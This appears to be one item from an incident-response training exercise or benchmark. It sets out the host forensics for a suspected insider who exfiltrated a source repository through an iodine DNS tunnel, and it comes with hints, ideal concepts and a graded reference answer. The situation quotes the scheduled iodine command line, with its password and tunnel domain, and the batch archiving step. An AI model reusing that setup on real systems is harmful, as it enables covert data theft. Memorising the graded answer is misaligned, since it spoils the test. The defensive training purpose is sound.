  title: Phase 2 — Host Forensics and Process Analysis
  situation: dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
  prompt: What is your forensic investigation priority?
  guidance:
    what: Test the initial theory against telemetry from dev-ws-047 before committing to a response.
    action: What is your forensic investigation priority?
    why: The quality of the recovery depends on how well the investigation proves what happened.
  hint: 'Ask which evidence source would prove or disprove the attacker''s reach before you act on assumptions. Focus: Phase 2 — Host Forensics and Process Analysis. Asset in scope: dev-ws-047.'
  hints:
  - Cross-reference findings with identity and privilege context.
  ideal_concepts:
  - decode dns
  - dns query
  - query payloads
  - payloads zeek
  - zeek logs
  - logs base32
  - base32 decoding
  - decoding reconstruct
  reference_answer: |-
    Decode DNS query payloads from Zeek logs using base32 decoding to reconstruct the exfiltrated archive. Cross-reference with r.patel's Git repository access logs to determine exactly which source code and secrets were in the repo-core directory. Check for any .env, .pem, or credential files in the archived content.

    Why: Determining exactly what was exfiltrated is critical for breach assessment. Source code repositories often contain API keys, database credentials, and proprietary algorithms. Reconstructing the archive from DNS queries quantifies the data loss precisely.
  followup_good: HR records show r.patel has been with the company for 4.2 years and recently received a negative performance review on Oct 15. r.patel's Git access logs show they cloned repo-core (containing the company's proprietary ML inference engine and 12 AWS access keys) on Nov 28, one day before the iodine scheduled task was created. Security camera logs show r.patel was the only person in the office on Nov 29 at 23:14 UTC when the task was created. The iodine binary was downloaded from a personal Dropbox account (not corporate OneDrive). r.patel's badge access logs show normal working hours with no after-hours access except Nov 29. The Hetzner nameserver was registered 5 days before the attack using a privacy-shielded WHOIS record.
  followup_weak: |-
    Determining exactly what was exfiltrated is critical for breach assessment.

